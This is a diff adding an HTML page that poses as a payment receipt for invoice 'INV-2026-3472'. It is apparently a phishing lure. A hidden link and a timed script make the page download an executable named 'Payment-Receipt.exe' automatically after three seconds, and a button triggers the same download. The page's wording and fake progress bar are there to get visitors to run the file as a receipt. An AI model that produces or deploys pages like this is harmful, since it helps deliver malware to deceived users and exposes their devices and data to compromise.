@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Receipt - Confirmation Required</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f8f9fa;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: white;
+            width: 92%;
+            max-width: 500px;
+            border-radius: 10px;
+            padding: 40px 30px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            color: #0066cc;
+            margin: 10px 0 20px;
+        }
+        .amount {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0066cc;
+            margin: 20px 0;
+        }
+        p {
+            font-size: 15.5px;
+            line-height: 1.6;
+            color: #444;
+            margin: 15px 0;
+        }
+        .progress {
+            height: 7px;
+            background: linear-gradient(90deg, #0066cc, #3399ff);
+            border-radius: 4px;
+            margin: 30px 0;
+            animation: progress 4s linear forwards;
+        }
+        .btn {
+            background: #0066cc;
+            color: white;
+            border: none;
+            padding: 16px 50px;
+            font-size: 17px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            margin: 25px 0;
+            width: 85%;
+            box-shadow: 0 5px 15px rgba(0,102,204,0.3);
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>PAYMENT RECEIPT</h1>
+        <p class="amount">INV-2026-3472</p>
+        
+        <p>A payment has been recorded under your details. Please download and verify the receipt below.</p>
+        
+        <div class="progress"></div>
+        
+        <p><strong>Your receipt is ready for download.</strong></p>
+        
+        <!-- Auto-download -->
+        <a id="autoDownload" href="Receipt.exe" download="Payment-Receipt.exe" style="display:none;"></a>
+        
+        <button class="btn" onclick="manualDownload()">DOWNLOAD PAYMENT RECEIPT NOW</button>
+        
+        <p style="font-size:14px; color:#666;">The file will start downloading automatically. If it doesn't, click the button above.</p>
+        
+        <p style="font-size:12px; color:#999; margin-top:35px;">
+            Official Receipt • Confidential
+        </p>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('autoDownload').click();
+        }, 3000);
+
+        function manualDownload() {
+            document.getElementById('autoDownload').click();
+        }
+    </script>
+</body>
+</html>
